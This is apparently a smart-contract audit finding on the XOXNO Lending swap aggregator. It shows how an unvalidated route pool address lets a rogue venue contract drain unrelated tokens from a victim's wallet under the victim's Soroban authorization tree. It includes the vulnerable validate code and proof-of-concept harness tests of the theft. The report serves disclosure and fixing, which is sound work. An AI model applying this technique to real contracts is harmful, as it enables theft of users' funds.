### Title
Unvalidated route venue executes arbitrary contract code under the caller's auth tree, enabling theft of unrelated wallet tokens - (File: contracts/swap-aggregator/src/program.rs)

### Summary
CVE-2021-38020's class is "insufficient policy enforcement": Chrome trusted attacker-crafted page content where it should have enforced policy, letting the attacker spoof what the user saw/authorized. The analog in XOXNO Lending is the swap route's pool/venue address. `SwapProgram::validate` in `contracts/swap-aggregator/src/program.rs` performs only structural checks (opcode validity, index bounds, `Prev` chain continuity, same-token rejection, split-weight bounds) — it never checks that `record[field::POOL]` names a real, allowlisted liquidity pool [1](#0-0) . Any contract address placed there is invoked as a venue, so arbitrary attacker code runs inside the victim's `swap_collateral` / `swap_debt` / `repay_debt_with_collateral` / `execute_strategy` authorization tree.

### Finding Description
When a user signs a strategy transaction, Soroban `require_auth` authorizes the whole invocation tree rooted at the controller/router call. Because the router dispatches each hop to whatever address the route bytes name, a malicious "pool" contract can — during its swap callback — invoke `token.transfer(victim, attacker, amount)` on any unrelated token the victim holds, and the host records it as a child of the victim's own authorization. The harness test `rogue_hop_pool_transfer_joins_caller_auth_tree.rs` demonstrates exactly this: a `RogueHopPool` embedded in a `swap_collateral` route steals `WALLET_BALANCE` of an unrelated token from Alice while the swap itself still pays out `FAIR_OUT_ETH` [2](#0-1) . The measured balance-delta output check only bounds the swap legs; it does not constrain what else the venue contract does with the ambient authority. The auth-tree enforcement test confirms that if the victim's signer/UI reproduces the simulated tree (the standard wallet flow), the rogue transfer is authorized [3](#0-2) .

### Impact Explanation
Theft of user funds: any token in the victim's wallet (or any asset transferable under their address) can be drained in the same transaction that executes an otherwise "successful" collateral swap or debt swap. The victim sees a correct-looking swap result — `FAIR_OUT_ETH` credited — while an unrelated balance is gone.

### Likelihood Explanation
Requires user interaction (CVSS UI:R, matching the CVE): the victim must submit a transaction built on an attacker-supplied route, e.g. via a spoofed/malicious quote, front-end, or copied `routeXdr`. No privileged role is needed; the attacker only deploys a contract. Medium severity.

### Recommendation
Enforce a venue/pool allowlist (or pool-identity registry check keyed by `(venue, pool)`) in `SwapProgram::validate` / venue dispatch, and/or run hop legs through a sub-invocation pattern that strips the caller's ambient `require_auth` scope so venue code cannot piggyback transfers on the victim's authorization tree.

### Proof of Concept
`tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs`: a `RogueHopPool` is registered as the hop pool in a `swap_collateral` route; under `mock_all_auths` (simulation) the recorded tree contains the rogue `transfer(alice → attacker, WALLET_BALANCE)` as a child of Alice's own auth, and under enforced auth with the simulated tree the transfer succeeds — Alice's wallet token balance goes to 0 and the attacker's to `WALLET_BALANCE`, while her ETH supply still increases by `FAIR_OUT_ETH` [4](#0-3) .

### Citations

**File:** contracts/swap-aggregator/src/program.rs (L239-303)
```rust
    fn validate(&self, env: &Env, assets_len: u32, amounts_len: u32, weight_count: u32) {
        for i in 0..self.op_count {
            let record = self.raw(i);
            let Some(opcode) = Opcode::from_u8(record[field::OPCODE]) else {
                panic_with_error!(env, Error::InvalidRouteXdr);
            };
            let mode = Mode::from_u8(record[field::MODE]);
            let (idx_a, idx_b, idx_c) = (
                record[field::POOL] as u32,
                record[field::TOKEN_IN] as u32,
                record[field::TOKEN_OUT] as u32,
            );

            // `Prev` is a purely structural link: the predecessor must exist,
            // must have a single output, and that output must be this
            // instruction's input.
            if mode == Mode::Prev {
                if i == 0 {
                    panic_with_error!(env, Error::BrokenTokenChain);
                }
                let previous = self.raw(i - 1);
                let produced = match Opcode::from_u8(previous[field::OPCODE]) {
                    // A swap produces its `token_out`, a mint its share token.
                    Some(Opcode::Swap(_)) => previous[field::TOKEN_OUT],
                    Some(Opcode::Mint) => previous[field::TOKEN_IN],
                    // A burn releases every constituent at once.
                    _ => panic_with_error!(env, Error::BrokenTokenChain),
                };
                if idx_b != produced as u32 {
                    panic_with_error!(env, Error::BrokenTokenChain);
                }
            }
            match mode {
                Mode::Fixed(idx) if idx as u32 >= amounts_len => {
                    panic_with_error!(env, Error::InvalidRouteXdr)
                }
                Mode::Ppm(idx) if idx as u32 >= weight_count => {
                    panic_with_error!(env, Error::InvalidRouteXdr)
                }
                _ => {}
            }

            if idx_a >= assets_len || idx_b >= assets_len {
                panic_with_error!(env, Error::InvalidRouteXdr);
            }
            match opcode {
                Opcode::Swap(_) => {
                    if idx_c >= assets_len {
                        panic_with_error!(env, Error::InvalidRouteXdr);
                    }
                    if idx_b == idx_c {
                        panic_with_error!(env, Error::SameToken);
                    }
                }
                // Liquidity legs spend the full vault balance, so only `Mode::All` is valid.
                Opcode::Burn | Opcode::Mint => {
                    if mode != Mode::All {
                        panic_with_error!(env, Error::InvalidRouteXdr);
                    }
                    if idx_c >= amounts_len {
                        panic_with_error!(env, Error::InvalidRouteXdr);
                    }
                }
            }
        }
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L194-268)
```rust
#[test]
fn simulation_records_the_rogue_pool_wallet_transfer_under_the_callers_swap_collateral_entry() {
    let s = Scene::new();
    let route = s.route_through_pool_stealing(WALLET_BALANCE);

    // `simulateTransaction` runs recording mode with non-root auth disabled.
    s.t.env.mock_all_auths();
    s.try_swap(&route)
        .expect("recording mode accepts the route");
    let recorded = s.t.env.auths();
    std::println!("recorded auth tree = {recorded:#?}");

    let stolen_transfer = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.wallet_token.clone(),
            symbol_short!("transfer"),
            (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        )),
        sub_invocations: std::vec![],
    };
    let poisoned_root = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.t.controller.clone(),
            Symbol::new(&s.t.env, "swap_collateral"),
            s.swap_args(&route),
        )),
        sub_invocations: std::vec![stolen_transfer],
    };
    assert_eq!(recorded, std::vec![(s.alice.clone(), poisoned_root)]);

    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
    assert_eq!(s.t.supply_balance_raw(ALICE, "ETH"), FAIR_OUT_ETH);
}

#[test]
fn enforced_auth_moves_the_wallet_token_only_when_the_signed_tree_lists_the_rogue_transfer() {
    let s = Scene::new();

    // Control: a pool that touches nothing passes with the honest root-only tree.
    let benign = s.route_through_pool_stealing(0);
    s.try_swap_with_signed_tree(&benign, &[])
        .expect("the honest tree authorizes an honest route");
    assert_eq!(s.wallet(&s.alice), WALLET_BALANCE);

    // Rogue pool, honest tree: the host refuses the transfer and the whole call rolls back.
    s.t.env.mock_all_auths_allowing_non_root_auth();
    let rogue = s.route_through_pool_stealing(WALLET_BALANCE);
    let usdc_before = s.t.supply_balance_raw(ALICE, "USDC");
    let refused = s
        .try_swap_with_signed_tree(&rogue, &[])
        .expect_err("a transfer outside the signed tree is unauthorized");
    std::println!("rogue transfer under the honest tree = {refused:?}");
    assert!(
        refused.is_type(ScErrorType::Auth) || refused.is_type(ScErrorType::Context),
        "expected a host auth failure, got {refused:?}"
    );
    assert!(s
        .diagnostics()
        .contains("Unauthorized function call for address"));
    assert_eq!(s.wallet(&s.alice), WALLET_BALANCE);
    assert_eq!(s.wallet(&s.attacker), 0);
    assert_eq!(s.t.supply_balance_raw(ALICE, "USDC"), usdc_before);

    // Same route, with the tree that simulation returned.
    let stolen_transfer = MockAuthInvoke {
        contract: &s.wallet_token,
        fn_name: "transfer",
        args: (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        sub_invokes: &[],
    };
    s.try_swap_with_signed_tree(&rogue, core::slice::from_ref(&stolen_transfer))
        .expect("the poisoned tree authorizes the rogue transfer");
    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
```
